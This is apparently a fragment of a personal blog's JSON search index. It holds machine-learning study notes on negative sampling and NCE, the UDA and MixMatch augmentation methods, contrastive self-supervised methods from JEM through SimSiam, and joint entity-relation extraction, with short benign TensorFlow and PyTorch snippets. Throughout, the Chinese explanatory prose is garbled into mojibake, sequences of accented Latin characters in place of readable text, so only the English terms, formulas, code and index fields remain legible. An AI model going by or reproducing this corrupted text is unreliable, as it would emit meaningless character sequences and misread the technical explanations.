‡å‡½æ•°çš„æœ€ä¼˜æ—¶ï¼Œå°±æ˜¯æ¨¡å‹æ‰€è¡¨ç¤ºçš„åˆ†å¸ƒå’Œç»éªŒåˆ†å¸ƒåŒ¹é…çš„æ—¶å€™ã€‚ NS(Negative Sampling) word2vecä½¿ç”¨è¿‡çš„æ–¹æ³•ï¼Œç›´æ¥å¯ä»¥å†™å‡ºç›®æ ‡æ¡ä»¶åˆ†å¸ƒï¼š \\[ \\begin{array}{l} p(d=0 \\mid c, w)=\\frac{1}{u_{\\theta}(w, c)+1} \\\\ p(d=1 \\mid c, w)=\\frac{u_{\\theta}(w, c)}{u_{\\theta}(w, c)+1} \\end{array} \\] å¯ä»¥çœ‹æˆ k = |V| ä¸” q ä¸ºå‡åŒ€åˆ†å¸ƒçš„NCEç‰¹æ®Šæƒ…å†µã€‚åœ¨åˆ†æä¸€æ¬¡åƒ \\(\\mathcal{L}_{\\mathrm{NCE}_{k}}\\) çš„æŸå¤±å‡½æ•°ï¼Œæˆ–è€…æ˜¯hinge losså½¢å¼çš„æŸå¤±å‡½æ•°ï¼Œæ±‚å¯¼åˆ†ææå€¼ï¼Œå¯ä»¥å‘ç°å®ƒæœ€ä¼˜æ—¶ï¼Œæ¨¡å‹æ‰€è¡¨ç¤ºçš„åˆ†å¸ƒå’Œç»éªŒåˆ†å¸ƒå¹¶ä¸åŒ¹é…ï¼Œå¯ä»¥ä¸ä¸€è‡´ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼ŒNSè™½ç„¶åœ¨word2vecè®­ç»ƒæ—¶ï¼Œå¯ä»¥å­¦ä¹ åˆ°wordçš„representationï¼Œä½†æ˜¯å®ƒå¹¶ä¸é€‚ç”¨äºè¯­è¨€æ¨¡å‹ç­‰æ›´generalçš„æƒ…æ™¯ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"ML","slug":"Notes/ML","permalink":"https://racleray.github.io/categories/Notes/ML/"}],"tags":[{"name":"NCE","slug":"NCE","permalink":"https://racleray.github.io/tags/NCE/"},{"name":"language model","slug":"language-model","permalink":"https://racleray.github.io/tags/language-model/"}]},{"title":"UDA & MixMatch","slug":"UDA-MixMatch","date":"2021-03-25T14:51:11.000Z","updated":"2023-08-07T11:54:31.035Z","comments":true,"path":"posts/d4b0eecc.html","link":"","permalink":"https://racleray.github.io/posts/d4b0eecc.html","excerpt":"ç®€è¦è®°å½•ä¸¤ç§æ¯”è¾ƒæ–°ä¸”æœ‰å®é™…æ•ˆæœçš„æ•°æ®å¢å¼ºæ–¹æ³•æ€è·¯ã€‚","text":"UDA ä½¿ç”¨æ— ç›‘ç£æ–¹æ³•ï¼ŒåŸºæœ¬æ¶æ„ç±»ä¼¼SimCLRç­‰å¯¹æ¯”å­¦ä¹ æ¨¡å‹ã€‚ å›¾ä¸­Mä¸ºè‡ªå®šä¹‰çš„æ¨¡å‹ã€‚ æ¨¡å‹æŸå¤±ï¼ŒUDAéƒ¨åˆ†ï¼š åŠ ä¸Šç›‘ç£å­¦ä¹ éƒ¨åˆ†ï¼š æ•°æ®å¢å¹¿ å›¾ç‰‡æ•°æ®ï¼šAutoAugment (RandAugment)ã€Cutout æ–‡æœ¬æ•°æ®ï¼šBackTranslationï¼›åŸºäºTF-IDFçš„è¯æ›¿æ¢ï¼Œä¿ç•™é‡è¦å…³é”®è¯ï¼Œæ›¿æ¢ä¸é‡è¦è¯ è®­ç»ƒæ–¹æ³• Training Signal Annealing (TSA)ï¼Œåœ¨è®­ç»ƒæ—¶é€æ­¥é‡Šæ”¾è®­ç»ƒä¿¡å·ï¼š æ¨¡å‹åœ¨æœ‰æ ‡æ³¨æ•°æ®ä¸Šï¼Œå…ˆæ‹Ÿåˆé¢„æµ‹æ¦‚ç‡å°äº \\(\\eta_t\\) çš„æ•°æ®ï¼Œé€æ¸è°ƒæ•´ \\(\\eta_t\\)ï¼Œè®­ç»ƒå…ˆéš¾åæ˜“ã€‚ ä¸‰ç§ç­–ç•¥è®¾ç½®ä¸‰ç§ \\(\\alpha_t\\)ï¼š logï¼š linear: exp: å½“æ¨¡å‹å®¹æ˜“è¿‡åº¦æ‹Ÿåˆæ—¶ï¼Œä¾‹å¦‚ï¼Œå½“é—®é¢˜ç›¸å¯¹å®¹æ˜“æˆ–æ ‡è®°æ•°æ®éå¸¸æœ‰é™æ—¶ï¼Œexp-scheduleæ˜¯æœ€åˆé€‚çš„ã€‚ç›¸åï¼Œå½“æ¨¡å‹ä¸å¤ªå¯èƒ½è¿‡åº¦æ‹Ÿåˆæ—¶(ä¾‹å¦‚ï¼Œå½“æœ‰ä¸°å¯Œçš„æ ‡è®°æ•°æ®æˆ–å½“æ¨¡å‹ä½¿ç”¨æœ‰æ•ˆçš„æ­£åˆ™åŒ–æ—¶)ï¼Œlog-scheduleæ›´åˆé€‚ã€‚ å…¶ä»–å¤„ç† åœ¨ä½¿ç”¨æ¨¡å‹Mé¢„æµ‹ æ— æ ‡æ³¨æ•°æ®æ—¶ï¼Œä½¿ç”¨Confidence-based maskingï¼Œå°†æ¦‚ç‡å°äº \\(\\beta\\) çš„è¿‡æ»¤æ‰ã€‚ ä½¿ç”¨sharpening predictionï¼Œå¤§çš„æ›´å¤§ï¼Œå°çš„æ›´å°ã€‚ å¯ä»¥ä½¿ç”¨entropy minimizationï¼š â€‹ ä¸Šå¼ä¸­è¿˜å¯ä»¥ä½¿ç”¨MixMatch sharpenigï¼š Domain-relevance Data Filteringï¼šå¯¹äºå¤–éƒ¨æœé›†çš„æ•°æ®ï¼Œå¯¹äºæ¯ä¸ªç±»åˆ«ï¼Œéƒ½åŸºäºå¯¹æ‰€æœ‰ç¤ºä¾‹è¿›è¡Œæ’åºå±äºè¯¥ç±»åˆ«çš„æ¦‚ç‡ï¼Œå¹¶é€‰æ‹©æ¦‚ç‡æœ€é«˜çš„ç¤ºä¾‹ï¼Œæ„æˆå¤–éƒ¨æ•°æ®ã€‚ å®˜æ–¹å®ç° MixMatch paperï¼Œtf2.0 æ–¹æ³• å¦ä¸€ç§æ··åˆæœ‰æ ‡ç­¾å’Œæ— æ ‡ç­¾æ•°æ®çš„æ–¹æ³•ã€‚æ•´ä½“æ–¹æ³•å¦‚ä¸‹ï¼š å¯¹äºæœ‰æ ‡ç­¾æ•°æ®ï¼Œå¢å¹¿batchä¸ªï¼Œè”åˆå…¶æ ‡ç­¾ \\(p_b\\) æ„æˆ \\(\\hat{X}\\) å¯¹æ— æ ‡ç­¾æ•°æ®ï¼Œæ¯ä¸ªæ ·æœ¬å¢å¹¿Kä¸ªï¼Œé€šè¿‡Label Guessingï¼Œå–æ¨¡å‹å¯¹Kä¸ªæ ·æœ¬é¢„æµ‹çš„å‡å€¼ï¼Œä½œä¸ºè¿™Kä¸ªæ ·æœ¬çš„ä¼ªæ ‡ç­¾ã€‚æ„æˆæ ·æœ¬é›† \\(\\hat{U}\\). Shuffleæ ·æœ¬é›†ï¼Œå°†å…¶è¿›è¡ŒMixUpï¼Œå¾—åˆ°MixMatchæ ·æœ¬é›†åˆ ç„¶åé€šè¿‡ä¸‹å¼è®¡ç®—æ¨¡å‹æŸå¤±ï¼Œæ¨¡å‹ä¸ºè‡ªå®šä¹‰æ¨¡å‹ï¼š Hå°±è¡¨ç¤ºæ™®é€šäº¤å‰ç†µæŸå¤±ï¼Œè‹¥æ˜¯åˆ†ç±»é—®é¢˜æ—¶ã€‚pã€qå°±æ˜¯MixMatchä¸­å¾—åˆ°çš„æ ‡ç­¾ã€‚qæ¥è‡ªLabel Guessingã€‚ ç»†èŠ‚ ä½¿ç”¨çš„æ–¹æ³•ï¼š æ•°æ®å¢å¹¿ï¼šcrop, flipç­‰å¸¸è§æ–¹æ³• Label Guessingï¼š sharpeningï¼š MixUpï¼š æ¨¡å‹è®­ç»ƒæ—¶å¯é‡‡ç”¨æ»‘åŠ¨å¹³å‡ã€weight decayç­‰æ–¹æ³• 12345678910111213141516171819@tf.functiondef sharpen(p, T): return tf.pow(p, 1/T) / tf.reduce_sum(tf.pow(p, 1/T), axis=1, keepdims=True)@tf.functiondef mixup(x1, x2, y1, y2, beta): beta = tf.maximum(beta, 1-beta) x = beta * x1 + (1 - beta) * x2 y = beta * y1 + (1 - beta) * y2 return x, y...def ema(model, ema_model, ema_decay): for var, ema_var in zip(model.variables, ema_model.variables): if var.trainable: ema_var.assign((1 - ema_decay) * var + ema_decay * ema_var) else: ema_var.assign(tf.identity(var)) æ¶ˆèå®éªŒç»“æœï¼š ä½¿ç”¨è®ºæ–‡ä¸­æåˆ°çš„æ‰€æœ‰æ–¹æ³•ï¼Œæ‰èƒ½å–å¾—æœ€å¥½çš„ç»“æœã€‚å…¶ä¸­MixUpæ“ä½œçš„å½±å“æœ€å¤§ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Data Augmentation","slug":"Notes/Data-Augmentation","permalink":"https://racleray.github.io/categories/Notes/Data-Augmentation/"}],"tags":[{"name":"data augmentation","slug":"data-augmentation","permalink":"https://racleray.github.io/tags/data-augmentation/"}]},{"title":"Self-supervised methods note","slug":"self-supervised-methods-note","date":"2021-03-25T10:56:12.000Z","updated":"2023-08-07T11:54:31.037Z","comments":true,"path":"posts/aa316e6c.html","link":"","permalink":"https://racleray.github.io/posts/aa316e6c.html","excerpt":"ç®€è¦è®°å½•ä»JEMã€SupContrastã€Momentum Contraståˆ°Simple Siameseçš„ä¸€ç³»åˆ—å¯¹æ¯”å­¦ä¹ æ–¹æ³•ã€‚","text":"JEM paper, link Google å»ºæ¨¡è”åˆæ¦‚ç‡ï¼Œfactorizeä¸ºç›‘ç£éƒ¨åˆ†å’Œéç›‘ç£éƒ¨åˆ†ã€‚åŒæ—¶è®ºæ–‡æŒ‡å‡ºä»yå¼€å§‹factorizeçš„è¯ï¼Œæ•ˆæœä¼šä¸‹é™ã€‚ energyéƒ¨åˆ†ä½¿ç”¨ Stochastic Gradient Langevin Dynamics ï¼ˆSGLDï¼‰å¯¹ç”Ÿæˆæ•°æ®é‡‡æ ·ï¼Œæœ€å°åŒ–å…¶energy frameworkï¼š è¾¾åˆ°æ•ˆæœï¼šæé«˜äº† calibrationï¼ˆè¾“å‡ºä¸çœŸå®åˆ†å¸ƒå…·æœ‰ä¸€è‡´æ€§ï¼‰, robustness, å’Œout-of-distribution detectionæ–¹é¢çš„æ€§èƒ½ã€‚ é—®é¢˜ï¼šè®­ç»ƒè‡ªç„¶ä¼šå˜æ…¢ï¼ˆCIFAR10ä¸€ä¸ªepochä¸ºåŠä¸ªå°æ—¶ï¼‰ï¼Œå¦å¤–å°±æ˜¯ä¸ç¨³å®šï¼ŒSGLDé‡‡æ ·ä½¿ç”¨éšæœºæ•°æ®å¼€å§‹ã€‚ JEMé‡‡æ ·æ–¹å¼æ¥è‡ª Implicit Generation and Modeling with EBM Buffer Sample igebm-pytorchï¼Œ linkï¼ŒGoogle å…ˆæ¯”äºVAEå’ŒGANï¼Œæ˜¯ä¸€ç§æ ¹æ®energyé‡‡æ ·çš„éšå¼é‡‡æ ·ï¼Œä½¿ç”¨ä¸€ä¸ªä¸»ç½‘ç»œï¼Œå¯ä»¥å°†ç”Ÿæˆçš„é™åˆ¶å’Œç›®æ ‡æ„å»ºæˆæŸå¤±å‡½æ•°ã€‚ä½†æ˜¯ç”Ÿæˆæ ·æœ¬åˆ†å¸ƒéœ€è¦æ›´å¤šçš„è®¡ç®—è¿­ä»£æ¬¡æ•°ã€‚ energy basedé‡‡æ ·ä¸»è¦æ˜¯é«˜ç»´æ•°æ®é‡‡æ ·å›°éš¾ã€‚çœŸå®å›¾ç‰‡åˆ†å¸ƒåœ¨high energyåŒºåŸŸï¼Œå™ªå£°å›¾ç‰‡åˆ†å¸ƒåœ¨low energyåŒºåŸŸã€‚ æ–¹æ³•ï¼š éšæœºè¾“å…¥å¼€å§‹ ä½¿ç”¨æ¨¡å‹è¾“å‡º + SGLDè¿­ä»£é‡‡æ ·å‡ºsample i å°†æ›´æ–°è¿‡çš„sample ié‡æ–°å†™å…¥buffer 2ã€3æ­¥è¿­ä»£ K æ¬¡ã€‚Kä¸èƒ½å¤ªå°ã€‚è®ºæ–‡ä¸­60ï¼ŒJEM 20 SGLDï¼š SupContrast paperï¼Œgitï¼ŒGoogle contrastive learningä¸€èˆ¬çš„æ–¹å¼æ˜¯ï¼Œå…ˆæ•°æ®å¢å¹¿ï¼Œç„¶åé€šè¿‡æ¨¡å‹è¯†åˆ«å‡ºæ¥è‡ªåŒä¸€å¼ å›¾çš„è¾“å…¥ï¼Œå°†ä¸æ˜¯æ¥è‡ªåŒä¸€å¼ å›¾çš„è¾“å…¥çš„ç›¸ä¼¼åº¦å˜å°ã€‚ Supervised Contrastive Learningå°†è¯†åˆ«å¯¹è±¡å˜ä¸ºåŒä¸€ç±»å›¾ç‰‡ï¼Œè€Œä¸æ˜¯åŒä¸€å¼ å›¾ç‰‡ã€‚ æŸå¤±å‡½æ•°å®šä¹‰ä¸ºï¼š è®ºæ–‡ä¸­è¿˜æœ‰å¦ä¸€ç§å½¢å¼çš„Lï¼Œä½†æ˜¯æ•ˆæœä¸å¥½ã€‚ é€šè¿‡å¼•å…¥æ ‡ç­¾æ•°æ®ï¼Œè®¡ç®—åŒä¸€ç±»å›¾ç‰‡çš„ç›¸ä¼¼åº¦ã€‚åœ¨è®¡ç®—æŸå¤±æ—¶ï¼Œå¤„ç†åŒä¸€ç±»å›¾ç‰‡æ–¹æ³•å¦‚ä¸‹ 12345678910111213141516...# å°†ç›¸åŒlabelçš„maskå‡ºæ¥mask = torch.eq(labels, labels.T).float()# tile maskï¼šå¢å¹¿æ•°æ®shapeåŒ¹é…mask = mask.repeat(anchor_count, contrast_count)# mask-out è‡ªå·±å¯¹è‡ªå·±ä½ç½®è¿›è¡Œmasklogits_mask = torch.scatter( torch.ones_like(mask), 1, torch.arange(batch_size * anchor_count).view(-1, 1).to(device), 0)mask = mask * logits_mask... æ¨¡å‹è®­ç»ƒåˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µã€‚å¦‚æœåªæ˜¯è®­ç»ƒä¸€ä¸ªencoderï¼Œåªéœ€è¦ç¬¬ä¸€é˜¶æ®µã€‚è‹¥æ˜¯è¦è¿›è¡Œåˆ†ç±»ä»»åŠ¡ï¼Œéœ€è¦å›ºå®šencoderè®­ç»ƒç¬¬äºŒé˜¶æ®µåˆ†ç±»å™¨ã€‚ å®éªŒç»“æœï¼šæ¨¡å‹å¯¹è¶…å‚æ•°çš„æ•æ„Ÿæ€§é™ä½ï¼Œä½¿ç”¨Supervised Contrastive Lossèƒ½å¤Ÿæå‡åˆ†ç±»å‡†ç¡®ç‡ï¼ˆè®ºæ–‡ä¸­åœ¨Imagenetç­‰å¤šä¸ªæ•°æ®é›†ä¸Šè¿›è¡Œäº†å®éªŒï¼‰ã€‚ Hybrid Discriminative-Generative paperï¼Œgit, UCB é€šè¿‡å¯¹æ¯”å­¦ä¹ contrastive learningï¼Œæ··åˆç›‘ç£ä¸éç›‘ç£ä¸€èµ·è®­ç»ƒã€‚å’ŒSupervised Contrastive Learningä¸­çš„encoderæ¡†æ¶ä¸åŒï¼Œæ²¡æœ‰ä¸¤ä¸ªç¼–ç çš„ contrastive è®¡ç®—ã€‚ä» å˜ä¸ºï¼š åªæœ‰ä¸€ä¸ªf(x)ç¼–ç ï¼Œå’Œ label yã€‚ è¿™ä¸ªå’Œ cross entropy æœ‰ç‚¹åƒã€‚ä½†æ˜¯æ•°æ®æ¥æºä¸åŒï¼Œè¿™é‡Œæ•°æ®æ˜¯æ¥è‡ªKå¤§å°çš„ normalization samplesï¼Œä¹Ÿæ˜¯æ¥è‡ªSGLDæ–¹æ³•ä¸­è®¾è®¡çš„bufferã€‚ è¿™ä¸ªæ–¹æ³•ä¹Ÿæ˜¯é’ˆå¯¹lossè¿›è¡Œå˜åŒ–ï¼š è®¡ç®—ä¸¤ä¸ªéƒ¨åˆ†çš„cross entropy lossã€‚ è®ºæ–‡ç»“æœï¼Œç›¸æ¯”äºJEMï¼Œåœ¨CIFAR10ä¸Šçš„æ•ˆæœï¼Œæœ‰ä¸€å®šæå‡ æé«˜äº† calibration, robustness, å’Œout-of-distribution detectionæ–¹é¢çš„æ€§èƒ½ã€‚ åŒæ—¶Kè¶Šå¤§ï¼Œæ•ˆæœè¶Šå¥½ã€‚â€œæœ‰é’±äººçš„æ¸¸æˆâ€ã€‚ Momentum Contrast paperï¼Œgitï¼ŒFB PyContrastï¼špytorch implementation of a set of (improved) SoTA methods using the same training and evaluation pipeline. é¦–å…ˆcontrastive loss è®¡ç®—çš„ä¸€èˆ¬æ¡†æ¶ï¼š å°±æ˜¯ k+1ä¸ªsoftmaxåˆ†ç±»å™¨ã€‚ ç›®å‰çš„è®­ç»ƒæ–¹å¼ï¼š end to endï¼šè¾“å…¥ä¸€ä¸ªbatchï¼Œè¿›è¡Œæ•°æ®å¢å¹¿ï¼Œç„¶åä¼˜åŒ–æ¥è‡ªåŒä¸€å¼ å›¾ç‰‡çš„ç›¸ä¼¼åº¦ã€‚å¦‚æœæœ‰å¤šä¸ªç±»ï¼Œé‚£ä¹ˆä¸€ä¸ªbatchçš„æ•°æ®ï¼Œè¦†ç›–çš„ç±»æ˜¯æœ‰é™çš„ã€‚ memory bank: ä½¿ç”¨ä¸€ä¸ªencoderï¼Œæ„å»ºmemory bankï¼ˆæ ·æœ¬çš„vectorè¡¨ç¤ºé›†åˆï¼‰ï¼ŒéšæœºæŠ½å–batch sizeä¸ªæ•°æ®ï¼Œä¸queryæ­£ä¾‹è®¡ç®—lossã€‚ç„¶åå†æ›´æ–°memory bankä¸­çš„æ ·æœ¬è¡¨è¾¾æ•°æ®ã€‚å¦‚æ­¤å¾ªç¯ã€‚ MoCoï¼šä½¿ç”¨ä¸€ä¸ªå¤§å°ä¸ºkçš„queueï¼Œå‡ºé˜Ÿbatch sizeä¸ªæ•°æ®ç»è¿‡ momentum encoderï¼Œä¸queryæ­£ä¾‹è®¡ç®—lossã€‚ç„¶åä½¿ç”¨ encoderçš„å‚æ•°ï¼Œä»¥ä¸€å®š momentum æ›´æ–° momentum encoderå‚æ•°ã€‚é‡æ–°å…¥é˜Ÿbatch sizeä¸ªæ ·æœ¬ã€‚ momentum æ›´æ–°ï¼Œè®ºæ–‡å®éªŒå‘ç°ï¼Œmåº”è¯¥è®¾ç½®ä¸ºä¸€ä¸ªå¾ˆæ¥è¿‘1çš„æ•°ï¼Œæ¯”å¦‚0.9999ï¼š MoCoä¼ªä»£ç ï¼š ç»è¿‡MoCoå¾—åˆ°ä¸€ä¸ªé¢„è®­ç»ƒæ¨¡å‹ encoderï¼Œä½¿ç”¨å°±ç±»ä¼¼ BERT ä¹‹ç±»çš„æ¨¡å‹ã€‚ æ¥ä¸€ä¸ªç®€å• Linear classifier å°±å¯ä»¥è¾¾åˆ°æ¥è¿‘ç›‘ç£è®­ç»ƒæ¨¡å‹çš„æ•ˆæœã€‚ SimCLR paperï¼Œgitï¼ŒGoogle åœ¨MoCoä¹‹ä¸Šçš„æ”¹è¿›ã€‚ä¸¤ä¸ªç‚¹ï¼š æ•°æ®å¢å¹¿åŠ ä¸€å€ï¼Œä¸€ä¸ªå›¾ç‰‡ä¼šæœ‰ä¸¤ä¸ª aug(x) ã€‚ è®¡ç®—NCEæ—¶ï¼Œä½¿ç”¨Cosine Similarityï¼Œè€Œä¸æ˜¯MoCoä¸­çš„ inner productã€‚ å¢å¹¿æ–¹æ³•ä½¿ç”¨äº†ï¼š frameworkï¼š æ¨¡å‹ç»“æ„ï¼š ä½¿ç”¨encoderæ—¶ï¼Œå¦‚æœä½¿ç”¨é¢„è®­ç»ƒçš„Resnetä¹‹ç±»åœ¨ImageNetè®­ç»ƒçš„æ¨¡å‹ï¼Œè¾“å‡ºéƒ¨åˆ†é‡æ–°è®¾è®¡ï¼Œä¸éœ€è¦è½¬åˆ°1000ç±»ï¼Œç›´æ¥è¾“å‡ºæ¨¡å‹è¡¨å¾ç»è¿‡avgpool + fc ä¹‹åçš„ç»“æœï¼Œå³ å›¾ä¸­ hã€‚ h ä¹‹åè¿˜å¢åŠ  g(x) DNNå±‚å˜æ¢ã€‚ å…¶ä»–å˜åŒ–ï¼š æ”¾å¼ƒ MoCoçš„ queueï¼Œä¹Ÿä¸ç”¨ memory bankï¼Œç›´æ¥ç”¨å¾ˆå¤§çš„batch size.... ä½¿ç”¨LARSä¼˜åŒ–å™¨ 32åˆ°128ä¸ªGPUè®­ç»ƒ è®ºæ–‡ç»™å‡ºçš„self-supervisedæ¨¡å‹+linear classifieråœ¨ImageNetä¸Šçš„Top-1 accuracy. Bootstrap your own latent paper, gitï¼Œ Google ç»“åˆSimCLRå’ŒMoCoï¼š ç»“æ„è¿˜æ˜¯SimCLRçš„ç»“æ„ï¼Œåªæ˜¯ä¸€ä¸ªåˆ†æ”¯åœ¨è¿™é‡Œç§°ä¸ºonlineï¼Œä¸€ä¸ªç§°ä¸ºtargetã€‚ ä½¿ç”¨MoCoçš„ momentum æ›´æ–° momentum encoderå‚æ•°çš„æ–¹æ³•ï¼Œæ›´æ–°targetç½‘è·¯å‚æ•°ã€‚ targetéƒ¨åˆ†ä¸è®¡ç®—bpã€‚ é‡æ–°å®šä¹‰æŸå¤±ä¸ºmean squared errorå½¢å¼ï¼Œä¸éœ€è¦æ„é€ è´Ÿæ ·æœ¬å¯¹ï¼š ç»“æ„ï¼š å½“ç„¶ï¼Œåˆæ˜¯ä¸€æ¬¡æå‡: åŒæ—¶ï¼ŒBYOLå¯¹batchçš„æ•æ„Ÿæ€§æ¯”SimCLRä½ä¸€äº›ã€‚ Simple Siamese: simpler &amp; better paperï¼Œgitï¼Œ FB ç»“åˆäº†BOYLå’ŒSimCLRï¼Œå°†Siameseç»“æ„åŠ å…¥æ¨¡å‹ï¼Œå¾—åˆ°ä¸€ä¸ªæ›´neatçš„è®¾è®¡ã€‚ åˆ æ‰BOYLçš„ momentum encoderã€‚ ä¸ç”¨æ„é€ SimCLRä¸­çš„negative pairsã€‚ encoderå¯¹ä¸¤ä¸ªaug(x)è®¡ç®—hidden representationï¼š è®¡ç®—æŸå¤±å‡½æ•°ï¼š ä¼ªä»£ç ï¼š stopgradéƒ¨åˆ†è§†ä¸ºä¸€ä¸ªconstantè¾“å…¥ã€‚ å…¶ä»–è®¾è®¡ï¼š ä¼˜åŒ–å™¨SGD + 0.9 momentumåŠ¨é‡ + 0.0001 çš„ weight decay ä¸å†éœ€è¦å¾ˆå¤§çš„batch sizeï¼Œbatch size 512å³å¯ æ¶ˆèå®éªŒç»“æœï¼š lrä¸è¦è¦decayï¼Œæ•ˆæœæœ€å¥½ batch sizeæœ€å¤§512å³å¯ lossè®¾è®¡ä¸º cosine å½¢å¼æ›´å¥½ï¼Œåœ¨hiddenå±‚å’Œpredictå±‚ä¹‹å‰ä½¿ç”¨BNæ•ˆæœæœ€å¥½ Lossçš„å¯¹ç§°è®¡ç®—å½¢å¼æå‡äº†æ•ˆæœã€‚ SimSiamä¸å†éœ€è¦negative sample pairs ï¼Œlarge batches ï¼Œå’Œmomentum encodersã€‚ç»ˆäºæ‰¾åˆ°ä¸€ä¸ªç®€æ´è€Œæœ‰æ•ˆçš„modelã€‚å½“ç„¶ï¼Œåæµªä¾ç„¶ä¼šæœ‰ã€‚ Why stop-gradient? è®ºæ–‡å‡è®¾åªæ˜¯ä¸€ä¸ªEMæ¨¡å‹ï¼š é‚£ä¹ˆé—®é¢˜è½¬åŒ–ä¸ºï¼š å‡è®¾ä» \\(\\eta\\) ç½‘ç»œè¾“å‡ºå°±å‡è®¾ä¸ºå½“å‰æœŸæœ›ä¼°è®¡ã€‚æ›´æ–°\\(\\theta\\)å°±æ˜¯åœ¨è®¡ç®—æœ€ä¼˜åŒ–æŸå¤±ã€‚æ‰€ä»¥ï¼Œè®¡ç®—æœŸæœ›æ—¶ï¼Œè‡ªç„¶æ˜¯ä¸æ›´æ–°\\(\\theta\\)çš„ã€‚ è¿™é‡Œpredictorçš„ä½œç”¨ä¹Ÿæ˜¯å‡è®¾lossæ˜¯åœ¨ä¸¤ä¾§ expectation ä¸Šè¿›è¡Œè®¡ç®—çš„ï¼Œè¿™åªæ˜¯å‡è®¾ï¼Œä¸¥æ ¼è¯æ˜æ²¡æœ‰ã€‚ è¿™å› ä¸ºEMæ˜¾ç¤ºçš„åˆç†æ€§ï¼Œæ‰€ä»¥åœ¨ stop-gradient æ—¶ï¼Œæ¨¡å‹èƒ½å¤Ÿæ”¶æ•›åˆ°ä¸€ä¸ªå¥½çš„ç»“æœã€‚è€Œå¦‚æœä¸è¿›è¡Œ stop-gradientï¼Œè®­ç»ƒåè€Œä¼šå˜å¾—ä¸ç¨³å®šã€‚ Contrastive Learning with Adversarial Examples ç†è®ºåç ”ç©¶ï¼Œæ²¡æœ‰å¼€æºå®ç°ã€‚ åŸºäºSimCLRæ¡†æ¶ï¼Œé€‰æ‹©èƒ½æœ€å¤§åŒ–å·®å¼‚çš„æ ·æœ¬ï¼Œç„¶åå†ä½¿ä¹‹ç›¸ä¼¼æ€§æŸå¤±æœ€å°åŒ–ã€‚ å°†SimCLRæŸå¤±å†™æˆï¼š ç„¶åå›ºå®šä¸€ä¸ªå¢å¹¿æ ·æœ¬è¾“å…¥ï¼Œç„¶åæ‰¾å·®å¼‚æœ€å¤§çš„å¦ä¸€ä¸ªï¼š è®¡ç®—æ‰°åŠ¨ï¼š å¾—åˆ°å¯¹æŠ—æ ·æœ¬ï¼š è®¡ç®—æŸå¤±ï¼ˆ16ï¼‰ï¼š ç®—æ³•è®¾è®¡ï¼š è®¡ç®— \\(W^*\\)ï¼ˆ15ï¼‰: More Adversarial Examples Improve Image Recognition paperï¼Œåœ¨EfficientNetä¸­ä½¿ç”¨çš„æ•ˆæœè¯„æµ‹ æå‡çš„åŸºæœ¬æ€æƒ³ï¼ŒåŠ å…¥å¯¹æŠ—æ ·æœ¬ï¼Œè”åˆåŸæ•°æ®è¿›è¡Œè®­ç»ƒ maxéƒ¨åˆ†ä¸ºæ±‚å¾—æœ€å¤§åŒ–å·®å¼‚çš„å¯¹æŠ—æ ·æœ¬æŸå¤±ã€‚ ä½†æ˜¯ï¼Œå®é™…æ•ˆæœå¹¶ä¸å¥½ï¼Œå› ä¸ºåŸæ•°æ®ä¸å¯¹æŠ—æ ·æœ¬çš„åˆ†å¸ƒä¸åŒ¹é…ã€‚æ‰€ä»¥æå‡ºï¼Œä¸¤ä¸ªBNåˆ†å¸ƒå¤„ç†åŸæ•°æ®å’Œå¯¹æŠ—æ ·æœ¬ã€‚ ç„¶åï¼Œåœ¨é¢„æµ‹æ—¶ï¼Œåªä½¿ç”¨ä¸»BNå±‚ã€‚ å½“æ¨¡å‹è¶Šå¤§ï¼Œæ•ˆæœæå‡è¶Šæ˜æ˜¾ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Contrastive Learning","slug":"Notes/Contrastive-Learning","permalink":"https://racleray.github.io/categories/Notes/Contrastive-Learning/"}],"tags":[{"name":"self-supervise","slug":"self-supervise","permalink":"https://racleray.github.io/tags/self-supervise/"},{"name":"contrastive learning","slug":"contrastive-learning","permalink":"https://racleray.github.io/tags/contrastive-learning/"}]},{"title":"Joint Extraction of Entities and Relations 2020","slug":"Joint-Extraction-of-Entities-and-Relations-2020","date":"2021-03-24T15:37:55.000Z","updated":"2023-08-07T11:54:31.030Z","comments":true,"path":"posts/aa5b647c.html","link":"","permalink":"https://racleray.github.io/posts/aa5b647c.html","excerpt":"è®°å½•2020å‡ ç¯‡å…³ç³»æŠ½å–è®ºæ–‡ï¼ŒåŒ…æ‹¬CasRelã€TPlinkerå’ŒTwo-are-better-than-oneã€‚å…¶æ€è·¯å¾ˆæœºæ™ºã€‚","text":"CasRel git å®ä½“è¯†åˆ«å’Œå…³ç³»åˆ†ç±»ä¸€ä½“åŒ–ï¼Œä½¿ç”¨ä¸€ä¸ªmodelè§£å†³ä¸¤ä¸ªé—®é¢˜ã€‚ä¼˜åŠ¿åœ¨äºï¼Œé€šè¿‡ä¸¤ä¸ªä»»åŠ¡çš„ç›¸å…³æ€§ï¼Œè®¾è®¡modelï¼Œå‡å°‘ä¸¤é˜¶æ®µé¢„æµ‹ä¸­çš„çº§è”è¯¯å·®ã€‚è™½ç„¶ï¼Œä¹Ÿæœ‰ä¸¤é˜¶æ®µæ¨¡å‹å®é™…æ•ˆæœå¯ä»¥å¾ˆå¥½ã€‚ é™¤äº†è§£å†³çº§è”è¯¯å·®ï¼Œè¿˜éœ€è¦è§£å†³ä»€ä¹ˆé—®é¢˜ï¼Ÿ Overlapping relationsï¼šä¸€ä¸ªå®ä½“å¯ä»¥å‡ºç°åˆ™åŒä¸€æ–‡æœ¬ä¸­çš„å¤šä¸ªå…³ç³»ä¸­ã€‚ Nested relationsï¼šä¸åŒçš„ä¸‰å…ƒç»„å¯èƒ½åŒ…å«æˆ–å…±äº«åµŒå¥—å®ä½“ã€‚ Texts Triplets Normal [The United States] President [Trump] will meet [Xi Jinping], the president of [China]. (The United States, president, Trump) (China, president, Xi Jinping) Single Entity Overlapping Two of them, [Jeff Francoeur] and [Brian McCann], are from [Atlanta]. (Jeff Francoeur, live in, Atlanta) (Brian McCann, live in, Atlanta) Entity Pair Overlapping The new mayor of [New York City] [De Blasio] is native-born. (New York City, mayor, De Blasio) (De Blasio, born in, New York City) Nested The new mayor of [[New York] City] [De Blasio] is native-born. (De Blasio, live in, New York City) (De Blasio, live in, New York) (New York, contains, New York City) 